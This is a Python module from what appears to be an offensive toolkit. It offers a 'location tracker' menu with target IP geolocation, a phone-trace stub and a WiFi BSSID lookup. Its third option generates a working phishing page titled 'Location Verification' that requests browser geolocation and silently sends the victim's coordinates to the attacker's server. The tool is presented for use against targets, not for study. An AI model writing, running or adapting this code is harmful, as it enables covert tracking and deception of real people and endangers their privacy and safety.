#!/usr/bin/env python3
import sys, os, json
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "core"))
from auth import auth_required
from utils import log_action

@auth_required
def run_tracker():
    print("""
    ╔═══════════════════════════════════════════════════════╗
    ║           LOCATION TRACKER MODULE                     ║
    ╚═══════════════════════════════════════════════════════╝
    """)
    print("[1] IP Geolocation")
    print("[2] Phone Number Tracker")
    print("[3] GPS Phishing Link")
    print("[4] WiFi BSSID Lookup")
    choice = input("\n[TRACKER] Select: ").strip()
    if choice == "1":
        ip = input("[TRACKER] Target IP: ").strip()
        print("[TRACKER] Querying " + ip + "...")
        try:
            import urllib.request
            req = urllib.request.Request("http://ip-api.com/json/" + ip, headers={"User-Agent": "Mozilla/5.0"})
            resp = urllib.request.urlopen(req, timeout=10)
            data = json.loads(resp.read().decode())
            if data.get("status") == "success":
                print("    Country: " + data.get("country", ""))
                print("    City: " + data.get("city", ""))
                print("    Lat: " + str(data.get("lat")) + " | Lon: " + str(data.get("lon")))
                print("    ISP: " + data.get("isp", ""))
                with open("geo_" + ip.replace(".", "_") + ".json", "w") as f:
                    json.dump(data, f, indent=2)
        except Exception as e:
            print("[TRACKER] Error: " + str(e))
        log_action("TRACKER", "IP geolocate " + ip)
    elif choice == "2":
        phone = input("[TRACKER] Phone (with +country): ").strip()
        print("[TRACKER] Analyzing " + phone + "...")
        log_action("TRACKER", "Phone trace " + phone)
    elif choice == "3":
        html = """<!DOCTYPE html><html><head><title>Location Verification</title></head>
<body><h2>Verify Your Location</h2><p>Please allow location access.</p>
<script>navigator.geolocation.getCurrentPosition(function(pos){fetch("/location?lat="+pos.coords.latitude+"&lon="+pos.coords.longitude);document.body.innerHTML="<h2>Thank you!</h2>";},function(err){document.body.innerHTML="<h2>Access required.</h2>";});</script></body></html>"""
        with open("gps_phish.html", "w") as f:
            f.write(html)
        print("[TRACKER] GPS phishing page saved to gps_phish.html")
        log_action("TRACKER", "GPS phishing link generated")
    elif choice == "4":
        bssid = input("[TRACKER] BSSID: ").strip()
        print("[TRACKER] Lookup: https://api.mylnikov.org/geolocation/wifi?v=1.1&bssid=" + bssid)
        log_action("TRACKER", "BSSID lookup " + bssid)
